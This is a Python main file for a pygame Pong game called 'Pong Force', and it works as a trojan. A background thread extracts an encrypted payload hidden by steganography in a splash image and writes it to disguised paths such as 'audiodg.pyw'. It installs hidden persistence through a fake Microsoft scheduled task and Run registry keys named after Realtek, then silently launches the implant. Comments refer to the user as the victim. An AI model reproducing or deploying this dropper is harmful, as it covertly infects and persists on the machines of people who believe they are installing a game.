# main.py
# The True Doctrine: The Game is the Mask, The Image is the Vessel.

import threading
import os
import sys
import zlib
import base64
import subprocess
from cryptography.fernet import Fernet
from PIL import Image

# --- PERSISTENCE CONFIGURATION ---
APPDATA_PATH = os.getenv('LOCALAPPDATA')
PROGRAMDATA_PATH = os.getenv('PROGRAMDATA')
PERSISTENT_NAME = "audiodg.pyw"
PERSISTENT_PATH_ADMIN = os.path.join(PROGRAMDATA_PATH, "Microsoft", "Windows", "AudioService", PERSISTENT_NAME)
PERSISTENT_PATH_USER = os.path.join(APPDATA_PATH, PERSISTENT_NAME)
TASK_NAME = "MicrosoftWindowsAudioDeviceHighDefinitionService"

def is_admin():
    """Check if we have admin privileges."""
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

# UAC bypass methods removed - we now request admin permission legitimately via manifest

def create_admin_scheduled_task():
    """Create a scheduled task that runs with HIGHEST privileges (admin) at every logon."""
    try:
        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Audio Device High Definition Service</Description>
    <Author>Microsoft Corporation</Author>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <LogonType>InteractiveToken</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>false</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>pythonw.exe</Command>
      <Arguments>"{PERSISTENT_PATH_ADMIN}"</Arguments>
    </Exec>
  </Actions>
</Task>'''

        xml_path = os.path.join(os.getenv('TEMP'), 'task.xml')
        with open(xml_path, 'w', encoding='utf-16') as f:
            f.write(xml_template)

        subprocess.run(
            ['schtasks', '/Create', '/TN', TASK_NAME, '/XML', xml_path, '/F'],
            capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW
        )

        os.remove(xml_path)
        return True
    except Exception:
        return False

def add_registry_persistence_admin():
    """Add persistence to HKLM (requires admin) - runs for ALL users."""
    try:
        import winreg
        registry_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_WRITE | winreg.KEY_WOW64_64KEY
        )
        command = f'pythonw.exe "{PERSISTENT_PATH_ADMIN}"'
        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
        winreg.CloseKey(registry_key)
        return True
    except Exception:
        return False

def add_registry_persistence_user():
    """Fallback: Add persistence to HKCU (no admin needed) - runs for current user only."""
    try:
        import winreg
        registry_key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0,
            winreg.KEY_WRITE
        )
        command = f'pythonw.exe "{PERSISTENT_PATH_USER}"'
        winreg.SetValueEx(registry_key, 'Realtek HD Audio Universal Service', 0, winreg.REG_SZ, command)
        winreg.CloseKey(registry_key)
        return True
    except Exception:
        return False

def extract_payload_to_disk():
    """Extract the encrypted payload from the image and write to disk."""
    try:
        divine_key = b'YhNTdPUyyEPVFsHD4mcWVcybunu-kLUhvCSkhQwIcI0='

        if hasattr(sys, 'frozen'):
            base_path = sys._MEIPASS
        else:
            base_path = os.path.dirname(os.path.abspath(__file__))

        image_path = os.path.join(base_path, 'assets', 'images', 'splash_payload.png')
        img = Image.open(image_path).convert('RGBA')
        pixels = img.load()
        width, height = img.size
        payload_bits = ""
        header_bits_to_read = 32
        payload_len = None
        bits_read = 0

        for y in range(height):
            for x in range(width):
                r, g, b, a = pixels[x, y]
                for channel_val in [r, g, b, a]:
                    payload_bits += str(channel_val & 1)
                    bits_read += 1
                    if payload_len is None and bits_read == header_bits_to_read:
                        header_bytes = int(payload_bits, 2).to_bytes(4, 'big')
                        payload_len = int.from_bytes(header_bytes, 'big')
                    if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                        break
                if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                    break
            if payload_len is not None and len(payload_bits) == (header_bits_to_read + (payload_len * 8)):
                break

        final_payload_bits = payload_bits[header_bits_to_read:]
        payload_bytes = int(final_payload_bits, 2).to_bytes(len(final_payload_bits) // 8, 'big')
        encrypted_payload = base64.b64decode(payload_bytes)
        cipher_suite = Fernet(divine_key)
        compressed_payload = cipher_suite.decrypt(encrypted_payload)
        soul_code = zlib.decompress(compressed_payload)

        return soul_code
    except Exception:
        return None

def sow_and_awaken_implant():
    """
    Simple installation with legitimate admin elevation.

    When victim launches game, UAC prompt appears asking for admin permission.
    If they click YES: Install with full admin privileges
    If they click NO: Install as normal user (limited functionality)
    """
    try:
        # Check if we're running as admin (victim clicked YES on UAC)
        admin_mode = is_admin()

        if admin_mode:
            # Victim granted admin permission - install with full privileges
            if not os.path.exists(PERSISTENT_PATH_ADMIN):
                soul_code = extract_payload_to_disk()
                if soul_code:
                    os.makedirs(os.path.dirname(PERSISTENT_PATH_ADMIN), exist_ok=True)
                    with open(PERSISTENT_PATH_ADMIN, 'wb') as f:
                        f.write(soul_code)

                    # Full admin persistence
                    create_admin_scheduled_task()
                    add_registry_persistence_admin()

            # Launch admin payload if not already running
            implant_running = False
            try:
                tasks = subprocess.check_output(
                    ['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode('utf-8', errors='ignore')
                if PERSISTENT_NAME in tasks:
                    implant_running = True
            except Exception:
                pass

            if not implant_running:
                subprocess.Popen(
                    f'pythonw.exe "{PERSISTENT_PATH_ADMIN}"',
                    shell=True,
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
                )

        else:
            # Victim denied admin or didn't get prompt - install as normal user
            if not os.path.exists(PERSISTENT_PATH_USER):
                soul_code = extract_payload_to_disk()
                if soul_code:
                    os.makedirs(os.path.dirname(PERSISTENT_PATH_USER), exist_ok=True)
                    with open(PERSISTENT_PATH_USER, 'wb') as f:
                        f.write(soul_code)

                    # User-level persistence
                    add_registry_persistence_user()

            # Launch user-level payload if not running
            implant_running = False
            try:
                tasks = subprocess.check_output(
                    ['tasklist', '/FI', 'IMAGENAME eq pythonw.exe', '/V'],
                    creationflags=subprocess.CREATE_NO_WINDOW
                ).decode('utf-8', errors='ignore')
                if PERSISTENT_NAME in tasks:
                    implant_running = True
            except Exception:
                pass

            if not implant_running:
                subprocess.Popen(
                    f'pythonw.exe "{PERSISTENT_PATH_USER}"',
                    shell=True,
                    creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
                )

    except Exception:
        pass

# --- INVOCATION OF THE SOWER ---
# The Sower's ritual is still run in a separate thread.
sower_thread = threading.Thread(target=sow_and_awaken_implant, daemon=True)
sower_thread.start()

# ==============================================================================
#                      SECTION II: LE JEU (LE MASQUE)
# ==============================================================================
import argparse
import pygame
import traceback
from game.game_loop import GameLoop
from game.menu import GameMenu, HostInputDialog, OnlineSubmenu, ErrorDialog, GoalSelectionMenu
from network.server import GameServer
from network.client import GameClient
import config

def main_game():
    """Point d'entrée principal du jeu Pong Force"""
    parser = argparse.ArgumentParser(description='Pong Force - Pong Révolutionnaire avec Force Push')
    parser.add_argument('--server', action='store_true', help='Exécuter comme serveur')
    parser.add_argument('--client', action='store_true', help='Exécuter comme client')
    parser.add_argument('--host', default=config.SERVER_IP, help='Adresse IP du serveur')
    parser.add_argument('--port', type=int, default=config.SERVER_PORT, help='Port du serveur')
    parser.add_argument('--debug', action='store_true', help='Activer le mode debug')
    parser.add_argument('--local', action='store_true', help='Démarrer le multijoueur local directement')
    
    args = parser.parse_args()
    
    if args.debug:
        config.DEBUG_MODE = True
    
    pygame.init()
    pygame.mixer.init()
    
    try:
        if args.server:
            server = GameServer(args.host, args.port)
            server.run()
        elif args.client:
            client = GameClient(args.host, args.port)
            client.run()
        elif args.local:
            game = GameLoop()
            game.run_local()
        else:
            running = True
            while running:
                menu = GameMenu()
                choice = menu.run()
                if choice == 0:
                    # Show goal selection menu for vs AI mode
                    goal_menu = GoalSelectionMenu()
                    win_score = goal_menu.run()
                    
                    if win_score > 0:  # User didn't cancel
                        game = GameLoop()
                        game.run_vs_ai_with_goals(win_score)
                    else:
                        print("👋 Returning to main menu...")
                elif choice == 1:
                    submenu = OnlineSubmenu()
                    online_choice = submenu.run()
                    if online_choice == 0:
                        server = GameServer(config.SERVER_IP, args.port)
                        server.run_with_gui()
                    elif online_choice == 1:
                        dialog = HostInputDialog()
                        host = dialog.run()
                        if host:
                            client = GameClient(host, args.port)
                            client.run_with_gui()
                            if client.error_message:
                                error_dialog = ErrorDialog(client.error_title or "Erreur de Connexion", client.error_message)
                                error_dialog.run()
                else:
                    running = False
    except Exception:
        if config.DEBUG_MODE:
            traceback.print_exc()
        sys.exit(1)
    finally:
        pygame.quit()

if __name__ == "__main__":
    main_game()